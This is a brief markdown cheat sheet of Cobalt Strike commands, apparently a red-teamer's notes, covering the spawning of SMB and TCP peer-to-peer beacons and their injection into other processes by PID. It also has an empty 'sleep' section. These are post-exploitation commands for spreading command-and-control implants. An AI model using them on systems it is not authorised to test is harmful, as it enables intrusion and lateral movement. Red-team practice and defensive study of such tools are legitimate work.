# CobaltStrike

## Command References


### Beacons
#### sleep
```

```

#### SMB Beacn
```bash
spawn <SMB-Listner-Name>                    ; Spawning a peer-to-peer ("P2P") SMB beacon 
inject <PID> <x86|x64> <SMB-Listner-Name>   ; Useful when trying to spawn P2P beacon as different user context
```
#### TCP Beacn
```bash
spawn <TCP-Listner-Name>                    ; Spawning a peer-to-peer ("P2P") TCP beacon 
                                            ; TCP beacons can be also run locally by clicking "Bind to localhost only" on GUI
inject <PID> <x86|x64> <TCP-Listner-Name>   ; Useful when trying to spawn P2P beacon as different user context
```
